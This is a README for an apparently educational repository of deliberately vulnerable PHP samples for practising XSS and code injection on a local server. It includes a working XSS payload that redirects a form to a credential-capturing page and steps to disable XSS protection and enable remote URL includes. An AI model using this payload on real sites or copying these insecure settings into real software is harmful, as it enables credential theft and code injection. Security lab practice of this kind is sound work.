# php-hacking

## Setup

Install XAMP or another based on your operating system. If using MAMP for mac clone this repo inside the `/Applications/MAMP/htdocs` directory.

```
cd /Applications/MAMP/htdocs
git clone git@github.com:ar-to/php-hacking.git
```
or create a symbolic link from where you prefer to clone it into and the directory where your server looks to serve you files.
```
cd /repos
git clone git@github.com:ar-to/php-hacking.git
ln -s -v ~/repos/php-hacking /Applications/MAMP/htdocs/php-hacking
```

Open the correct url for the sample. See below.

### Browser

Change the port to the one provided by your server. Below uses MAMP 8888.

- XSS form action: http://localhost:8888/php-hacking/xss-php/xss-form-action.php
- Code Injection: http://localhost:8888/php-hacking/code-injection-php/victim.php

## Instructions

### XSS via Form action

This sample is mostly taken from the following [youtube video](https://www.youtube.com/watch?v=XTDfKG7RHgU&t=118s&index=2&list=PLwsoBw4_og3qHKFtfIATvbvq3Koy45x24) but some changes were made including: 
- bypassing chrome xss protection
- showing javascript code to get url params, which I took from [here](https://gomakethings.com/getting-all-query-string-values-from-a-url-with-vanilla-js/)
- you may find additional info about XSS [here](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)

#### Steps
1. test the forms
2. past the javascript code into the search input ans submit:
```
<script>window.onload=function() {document.forms[0].action = "http://localhost:8888/php-hacking/xss-php/stolen.php"};</script>
```
The url is relative to the directory of this sample, but it could be an external one pointing to a remote server where the attacker can save the credentials into a databse or their own file.
3. If you are using Chrome and get an error: ERR_BLOCKED_BY_XSS_AUDITOR uncomment `header('X-XSS-Protection:0');` from the top of `xss-php/xss-form-action/php` and retry.
4. check the log.txt file in the `xss-php` directory

### Code injection via include and url param

References
- [php.ini docs](http://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)
- this sample was taken from [here](https://www.defensecode.com/public/web_vulns/code-injection.html) but I included instructions on usage and having to turn `allow-url-include` on before this can work. 

1. test the form
2. Follow the instructions in the page

